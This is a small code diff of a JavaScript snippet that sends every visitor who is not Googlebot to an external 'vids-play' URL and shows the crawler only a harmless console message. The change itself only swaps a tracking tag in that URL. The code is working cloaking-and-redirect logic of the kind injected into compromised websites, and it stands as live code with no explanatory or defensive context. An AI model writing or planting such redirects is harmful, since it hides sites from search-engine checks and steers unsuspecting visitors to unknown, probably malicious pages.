@@ -1,5 +1,5 @@
 if (!navigator.userAgent.includes('Googlebot')) {
-  window.location.href = "https://unavuulagam.in/vids-play/?gittu";
+  window.location.href = "https://unavuulagam.in/vids-play/?pintu";
 } else {
   console.log("Thanks for visiting my page" );
 }
